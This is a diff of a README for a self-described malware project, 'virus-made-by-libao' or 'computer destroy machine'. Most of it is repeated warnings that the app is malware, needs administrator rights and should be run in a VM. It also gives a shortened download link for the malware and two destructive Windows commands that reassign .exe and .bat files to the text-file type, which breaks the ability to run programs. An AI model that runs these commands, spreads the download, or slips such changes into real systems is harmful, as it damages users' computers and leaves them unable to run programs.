@@ -1,10 +1,22 @@
 # virus-made-by-libao
-The app need Administrators!!!
+------------------important------------------
+The app is malware!
+
+
+The app is malware!
+
+
+The app is malware!
 
 The app need Administrators!!!
 
+
 The app need Administrators!!!
 
+
+The app need Administrators!!!
+
+------------------important------------------
 
 github direct download:
 https://reurl.cc/mye6kM
@@ -20,22 +32,20 @@ add:
 assoc .exe=TXTFILE
 assoc .bat=TXTFILE
 
+
 warning__________________________________________________________________________
-
-The app is malware!!!
-
-The app is malware!!!
-
-The app is malware!!!
+The app is malware!
 
 
-The app need Administrators!!!
+The app is malware!
 
-The app need Administrators!!!
 
-The app need Administrators!!!
+The app is malware!
+
+warning__________________________________________________________________________
 
 
 Run the app in VM(https://www.virtualbox.org/wiki/Downloads)
+
 
 CDM = computer destroy machine
